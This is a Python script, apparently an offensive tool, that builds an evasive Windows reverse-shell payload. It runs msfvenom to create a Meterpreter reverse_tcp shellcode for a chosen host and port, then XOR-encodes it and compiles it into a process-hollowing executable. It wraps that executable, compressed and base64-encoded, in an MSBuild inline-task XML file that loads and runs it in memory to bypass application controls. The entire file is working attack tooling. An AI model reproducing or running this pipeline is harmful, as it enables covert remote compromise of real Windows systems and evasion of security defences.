import os
import subprocess
import argparse
import re
import xml.etree.ElementTree as ET
import base64
import zlib
import sys

def ReadFile(file):
    try:
        fobj = open(file, "rb") 
        contents = fobj.read()
        fobj.close()
        return contents
    except:
        print("[-] File read error: " + file)
        sys.exit()
        
def SaveFile(contents, file):
    try:
        fobj = open(file, "w") 
        fobj.write(contents)
        fobj.close()
        print("[*] File saved: " + file)
    except:
        print("[-] File write error: " + file)
        sys.exit()

# https://github.com/bohops/GhostBuild
def GenerateGhostBuild(gContents, gArgs):
    n = 1
    
    #[StackOverflow Python Inflate/Deflate Streams [https://stackoverflow.com/questions/1089662/python-inflate-and-deflate-implementations]
    gLen = str(len(gContents))
    gCompressed = zlib.compress(gContents)[2:-4]
    gEncoded = base64.b64encode(gCompressed).decode()
    
    return '''
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="GhostBuild">
   <GhostBuilder />
  </Target>
<UsingTask
    TaskName="GhostBuilder"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>
        <Code Type="Class" Language="cs">
            <![CDATA[
                using System;
                using System.IO;
                using System.Reflection;
                using System.IO.Compression;
                using Microsoft.Build.Framework;
                using Microsoft.Build.Utilities;

                public class GhostBuilder :  Task, ITask
                {
                    public override bool Execute()
                    {
                        string[] args = new string[] { ''' + gArgs + ''' };                        
                        string compressedBin = "''' + gEncoded + '''";
                        int compressedBinSize = ''' + gLen + ''';

                        Byte[] bytesBin = new byte[compressedBinSize];
                        using (MemoryStream inputStream = new MemoryStream(Convert.FromBase64String(compressedBin)))
                        {
                            using (DeflateStream stream = new DeflateStream(inputStream, CompressionMode.Decompress))
                            {
                                stream.Read(bytesBin, 0, compressedBinSize);
                            }
                        }
                        
                        Assembly assembly = Assembly.Load(bytesBin);
                        assembly.EntryPoint.Invoke(null, new object[] { args });
                        return true;
                    }
                }
            ]]>
        </Code>
    </Task>
    </UsingTask>
</Project>
'''

# Generate shellcode using msfvenom
def generate_shellcode(lhost: str, lport: int) -> str:
    try:
        print("[*] Generating shellcode using msfvenom...")
        result = subprocess.run(
            [
                "C:\\metasploit-framework\\bin\\msfvenom.bat",
                "-p", "windows/x64/meterpreter/reverse_tcp",
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "EXITFUNC=thread",
                "-f", "csharp",
            ],
            capture_output=True, text=True, check=True
        )
        print("[*] Shellcode generated successfully.")
        return result.stdout
    except subprocess.CalledProcessError as e:
        print("[!] Failed to generate shellcode.")
        print(e.stderr)
        return ""

# Replace placeholders in files
def replace_placeholder(file_path: str, placeholder: str, replacement: str) -> None:
    try:
        print(f"[*] Replacing placeholder {{{{{{{placeholder}}}}}}} in {file_path}/Program.cs.bak to Program.cs...")
        with open(f"{file_path}/Program.cs.bak", "r") as file:
            content = file.read()
        
        updated_content = re.sub(rf"{{{{{{{placeholder}}}}}}}", replacement, content)
        
        with open(f"{file_path}/Program.cs", "w") as file:
            file.write(updated_content)
        
        print("[*] Placeholder replaced successfully.")
    except Exception as e:
        print(f"[!] Error replacing placeholder in {file_path}: {e}")

# Ensure Release|x64 configuration in .sln and .csproj
def check_and_add_config(sln_path: str, project_path: str) -> None:
    try:
        print(f"[*] Checking and updating {sln_path} for Release|x64 configuration...")
        with open(sln_path, "r") as file:
            sln_content = file.readlines()
        
        config_section_start = -1
        for i, line in enumerate(sln_content):
            if "GlobalSection(SolutionConfigurationPlatforms)" in line:
                config_section_start = i
                break
        
        has_release_x64 = any("Release|x64 = Release|x64" in line for line in sln_content)
        
        if config_section_start != -1 and not has_release_x64:
            sln_content.insert(config_section_start + 1, "        Release|x64 = Release|x64\n")
            with open(sln_path, "w") as file:
                file.writelines(sln_content)
            print("[*] Added Release|x64 configuration to the solution file.")
        else:
            print("[*] Release|x64 configuration already exists in the solution file.")

        # Update .csproj file
        tree = ET.parse(project_path)
        root = tree.getroot()
        namespace = "{http://schemas.microsoft.com/developer/msbuild/2003}"
        
        has_release_x64 = False
        for property_group in root.findall(f"{namespace}PropertyGroup"):
            if "Condition" in property_group.attrib and "Release|x64" in property_group.attrib["Condition"]:
                has_release_x64 = True
                break
        
        if not has_release_x64:
            new_property_group = ET.Element("PropertyGroup", Condition="'$(Configuration)|$(Platform)' == 'Release|x64'")
            ET.SubElement(new_property_group, "PlatformTarget").text = "x64"
            ET.SubElement(new_property_group, "OutputPath").text = "bin\\x64\\Release\\"
            root.append(new_property_group)
            
            tree.write(project_path, encoding="utf-8", xml_declaration=True)
            print(f"[*] Added Release|x64 configuration to {project_path}")
        else:
            print(f"[*] Release|x64 configuration already exists in {project_path}")
    except Exception as e:
        print(f"[!] Error updating configuration: {e}")

# Compile and run a project
def compile_and_run_project(msbuild_path: str, project_path: str, project_name: str, run: bool) -> str:
    try:
        print(f"[*] Compiling project: {project_path}...")
        result = subprocess.run(
            [msbuild_path, project_path, "/p:Configuration=Release", "/p:Platform=x64"],
            capture_output=True, text=True, check=True
        )
        print("[*] Project compiled successfully.")
        exe_path = os.path.join(os.path.dirname(project_path), "bin", "x64", "Release", f"{project_name}.exe")
        if os.path.isfile(exe_path):
            if not run:
                print(f"[*] Not running executable: {exe_path}...")
                return ""
            else:
                print(f"[*] Running executable: {exe_path}...")
                result = subprocess.run([exe_path], capture_output=True, text=True, check=True)
                print("[*] Execution succeeded.")
                return result.stdout
        else:
            print(f"[!] Executable not found: {exe_path}")
            return ""
    except subprocess.CalledProcessError as e:
        print("[!] Compilation or execution failed:")
        print(e.stderr)
        return ""

# Extract encoded shellcode from output
def extract_encoded_shellcode(raw_output: str) -> str:
    try:
        print("[*] Extracting encoded shellcode...")
        match = re.search(r"(byte\[\] buf = new byte\[\d+\] \{.*?\};)", raw_output, re.DOTALL)
        if match:
            encoded_shellcode = match.group(1).replace("\r", "").replace("\n", "").strip()
            print("[*] Encoded shellcode extracted successfully.")
            return encoded_shellcode
        else:
            print("[!] Encoded shellcode not found in the output.")
            return ""
    except Exception as e:
        print(f"[!] Error extracting encoded shellcode: {e}")
        return ""

# Main function
def main(lhost: str, lport: int, xor_encoder_path: str, outfile: str, xor_hollowing_path: str, msbuild_path: str) -> None:
    # Generate shellcode
    shellcode = generate_shellcode(lhost=lhost, lport=lport)
    if not shellcode:
        print("[!] Shellcode generation failed. Exiting.")
        return

    # Insert shellcode into XOR Encoder
    replace_placeholder(file_path=xor_encoder_path, placeholder="shellcode", replacement=shellcode)

    # Check and configure solution/project for XOR Encoder
    check_and_add_config(
        sln_path=os.path.join(xor_encoder_path, "XOR Shellcode Encoder.sln"),
        project_path=os.path.join(xor_encoder_path, "XOR Shellcode Encoder.csproj")
    )

    # Compile and execute XOR Encoder
    xor_encoder_output = compile_and_run_project(
        msbuild_path=msbuild_path,
        project_path=os.path.join(xor_encoder_path, "XOR Shellcode Encoder.sln"),
        project_name="XOR Shellcode Encoder",
        run=True
    )
    encoded_shellcode = extract_encoded_shellcode(xor_encoder_output)
    if not encoded_shellcode:
        print("[!] Encoded shellcode extraction failed. Exiting.")
        return

    # Insert encoded shellcode into XOR Hollowing
    replace_placeholder(file_path=xor_hollowing_path, placeholder="encoded_shellcode", replacement=encoded_shellcode)

    # Check and configure solution/project for XOR Hollowing
    check_and_add_config(
        sln_path=os.path.join(xor_hollowing_path, "Shellcode Process Hollowing.sln"),
        project_path=os.path.join(xor_hollowing_path, "Shellcode Process Hollowing.csproj")
    )

    # Compile and execute XOR Hollowing
    compile_and_run_project(
        msbuild_path=msbuild_path,
        project_path=os.path.join(xor_hollowing_path, "Shellcode Process Hollowing.sln"),
        project_name="Shellcode Process Hollowing",
        run=False
    )

    gContents = ReadFile(os.path.join(os.path.dirname(xor_hollowing_path), "Shellcode Process Hollowing", "bin", "x64", "Release", "Shellcode Process Hollowing.exe"))
    gBuild = GenerateGhostBuild(gContents, "")
    SaveFile(gBuild, outfile)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Automate shellcode generation, encoding, and process hollowing.")
    parser.add_argument("--lhost", required=True, help="Local host for the reverse shell.")
    parser.add_argument("--lport", required=True, type=int, help="Local port for the reverse shell.")
    parser.add_argument("--outfile", help="Path to output MSBuild file.", default="rev.xml")
    parser.add_argument("--xor-encoder-path", help="Path to XOR Shellcode Encoder project.", default="XOR Shellcode Encoder")
    parser.add_argument("--xor-hollowing-path", help="Path to XOR Shellcode Process Hollowing project.", default="Shellcode Process Hollowing")
    parser.add_argument("--msbuild-path", help="Path to MSBuild.exe.", default="C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe")


    args = parser.parse_args()

    main(
        lhost=args.lhost,
        lport=args.lport,
        outfile=args.outfile,
        xor_encoder_path=args.xor_encoder_path,
        xor_hollowing_path=args.xor_hollowing_path,
        msbuild_path=args.msbuild_path,
    )
